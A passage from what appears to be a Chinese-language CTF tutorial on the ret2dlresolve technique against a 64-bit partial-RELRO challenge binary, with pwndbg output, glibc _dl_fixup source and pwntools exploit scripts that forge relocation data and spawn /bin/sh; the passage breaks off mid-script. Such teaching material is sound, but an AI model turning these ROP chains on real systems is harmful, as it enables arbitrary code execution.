   0x7fe00ad7eecc &lt;_dl_fixup+140&gt;    mov    eax, 0
   0x7fe00ad7eed1 &lt;_dl_fixup+145&gt;    mov    r9d, dword ptr [r8 + 8]
   0x7fe00ad7eed5 &lt;_dl_fixup+149&gt;    test   r9d, r9d
   0x7fe00ad7eed8 &lt;_dl_fixup+152&gt;    cmove  r8, rax
   0x7fe00ad7eedc &lt;_dl_fixup+156&gt;    mov    edx, dword ptr fs:[0x18]
   0x7fe00ad7eee4 &lt;_dl_fixup+164&gt;    test   edx, edx
</code></pre></div> <p>通過調試，我們發現，程序是在獲取對應的版本號</p> <ul> <li>rax 爲 0x4003f6，指向版本號數組</li> <li>rdx 爲 0x155f1，符號表索引，同時爲版本號索引</li> </ul> <p>同時 rax + rdx*2 爲 0x42afd8，而這個地址並不在映射的內存中。</p> <div class=highlight><pre><span></span><code>pwndbg&gt; print /x $rax + $rdx*2
$1 = 0x42afd8
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
          0x600000           0x601000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
          0x601000           0x602000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
    0x7fe00a97e000     0x7fe00ab65000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ab65000     0x7fe00ad65000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad65000     0x7fe00ad69000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad69000     0x7fe00ad6b000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad6b000     0x7fe00ad6f000 rw-p     4000 0      
    0x7fe00ad6f000     0x7fe00ad96000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af79000     0x7fe00af7b000 rw-p     2000 0      
    0x7fe00af96000     0x7fe00af97000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af97000     0x7fe00af98000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af98000     0x7fe00af99000 rw-p     1000 0      
    0x7fffb43a9000     0x7fffb43cb000 rw-p    22000 0      [stack]
    0x7fffb43fb000     0x7fffb43fe000 r--p     3000 0      [vvar]
    0x7fffb43fe000     0x7fffb4400000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
</code></pre></div> <p>那我們能不能想辦法讓它位於映射的內存中呢。估計有點難</p> <ul> <li>bss 的起始地址爲 0x601050，那麼索引值最小爲 (0x601050-0x400398)/24=87517，即 0x4003f6 + 87517*2 = 0x42afb0</li> <li>bss 可以最大使用的地址爲 0x601fff，對應的索引值爲(0x601fff-0x400398)/24=87684，即0x4003f6 + 87684*2 = 0x42b0fe</li> </ul> <p>顯然都在非映射的內存區域。因此，我們得考慮考慮其它辦法。通過閱讀 dl_fixup 的代碼</p> <div class=highlight><pre><span></span><code><span class=w>        </span><span class=c1>// 獲取符號的版本信息</span>
<span class=w>        </span><span class=k>const</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>r_found_version</span><span class=w> </span><span class=o>*</span><span class=n>version</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
<span class=w>        </span><span class=p>{</span>
<span class=w>            </span><span class=k>const</span><span class=w> </span><span class=n>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=n>vernum</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>const</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>D_PTR</span><span class=p>(</span><span class=n>l</span><span class=p>,</span><span class=w> </span><span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]);</span>
<span class=w>            </span><span class=n>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span><span class=w> </span><span class=n>ndx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>vernum</span><span class=p>[</span><span class=n>ELFW</span><span class=p>(</span><span class=n>R_SYM</span><span class=p>)(</span><span class=n>reloc</span><span class=o>-&gt;</span><span class=n>r_info</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0x7fff</span><span class=p>;</span>
<span class=w>            </span><span class=n>version</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_versions</span><span class=p>[</span><span class=n>ndx</span><span class=p>];</span>
<span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>version</span><span class=o>-&gt;</span><span class=n>hash</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
<span class=w>                </span><span class=n>version</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
</code></pre></div> <p>我們發現，如果把 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 設置爲 NULL，那程序就不會執行下面的代碼，版本號就爲 NULL，就可以正常執行代碼。但是，這樣的話，我們就需要知道 link_map 的地址了。 GOT 表的第 0 項（本例中 0x601008）存儲的就是 link_map 的地址。</p> <p>因此，我們可以</p> <ul> <li>泄露該處的地址</li> <li>將 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 設置爲 NULL</li> <li>最後執行利用腳本即可</li> </ul> <p>通過彙編代碼，我們可以看出 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 的偏移爲 0x1c8</p> <div class=highlight><pre><span></span><code> ► 0x7fa4b09f7ea1 &lt;_dl_fixup+97&gt;     mov    rax, qword ptr [r10 + 0x1c8]
   0x7fa4b09f7ea8 &lt;_dl_fixup+104&gt;    xor    r8d, r8d
   0x7fa4b09f7eab &lt;_dl_fixup+107&gt;    test   rax, rax
   0x7fa4b09f7eae &lt;_dl_fixup+110&gt;    je     _dl_fixup+156 &lt;_dl_fixup+156&gt;
</code></pre></div> <p>因此，我們可以簡單修改下 exp。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400780</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
<span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>

<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
    <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rela.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>relaent</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_RELAENT&quot;</span><span class=p>)</span> <span class=c1># reloc entry size</span>

    <span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>syment</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_SYMENT&quot;</span><span class=p>)</span> <span class=c1># symbol entry size</span>

    <span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>


    <span class=c1># construct fake function string</span>
    <span class=n>func_string_addr</span> <span class=o>=</span> <span class=n>store_addr</span>
    <span class=n>resolve_data</span> <span class=o>=</span> <span class=n>func_name</span> <span class=o>+</span> <span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span>

    <span class=c1># construct fake symbol</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>syment</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>syment</span> <span class=c1># align syment size</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>symbol_addr</span><span class=o>+</span><span class=n>pad</span>
    <span class=n>symbol</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>func_string_addr</span><span class=o>-</span><span class=n>dynstr</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x12</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>symbol_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span> <span class=n>symbol</span>

    <span class=c1># construct fake reloc </span>
    <span class=n>reloc_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>reloc_addr</span> <span class=o>-</span> <span class=n>rel_plt</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>relaent</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>relaent</span> <span class=c1># align relaent size</span>
    <span class=n>reloc_addr</span> <span class=o>+=</span><span class=n>pad</span>
    <span class=n>reloc_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>reloc_addr</span><span class=o>-</span><span class=n>rel_plt</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>rinfo</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_index</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=mi>7</span>
    <span class=n>write_reloc</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>resolve_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>rinfo</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=n>write_reloc</span>

    <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>reloc_index</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span>


<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>

<span class=n>store_addr</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>

<span class=c1># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=s2>&quot;system&quot;</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;write&quot;</span><span class=p>])</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>store_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=c1># send resolve data</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>

<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span>
<span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>bin_sh_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>)))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>


<span class=c1># leak link_map addr</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>],</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x601008</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>link_map_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>link_map_addr</span><span class=p>))</span>


<span class=c1># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>link_map_addr</span><span class=o>+</span><span class=mh>0x1c8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x00000000004007a3</span><span class=p>)</span> <span class=c1># 0x00000000004007a3: pop rdi; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>resolve_call</span><span class=p>)</span>
<span class=c1># rop.raw(&#39;a&#39;*(256-len(rop.chain())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>然鵝，還是崩潰。但這次比較好的是，確實已經執行到了 system 函數。通過調試，我們可以發現，system 函數在進一步調用 execve 時出現了問題</p> <div class=highlight><pre><span></span><code> ► 0x7f7f3f74d3ec &lt;do_system+1180&gt;       call   execve &lt;execve&gt;
        path: 0x7f7f3f8b20fa ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */
        argv: 0x7ffe63677000 —▸ 0x7f7f3f8b20ff ◂— 0x2074697865006873 /* &#39;sh&#39; */
        envp: 0x7ffe636770a8 ◂— 0x10000
</code></pre></div> <p>即環境變量的地址指向了一個莫名的地址，這應該是我們在進行 ROP 的時候破壞了棧上的數據。那我們可以調整調整，使其爲 NULL 或者儘可能不破壞原有的數據。這裏我們選擇使其爲 NULL。</p> <p>首先，我們可以把讀僞造的數據和 /bin/sh 部分的 rop 合併起來，以減少 ROP 的次數</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400780</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
<span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>

<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
    <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rela.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>relaent</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_RELAENT&quot;</span><span class=p>)</span> <span class=c1># reloc entry size</span>

    <span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
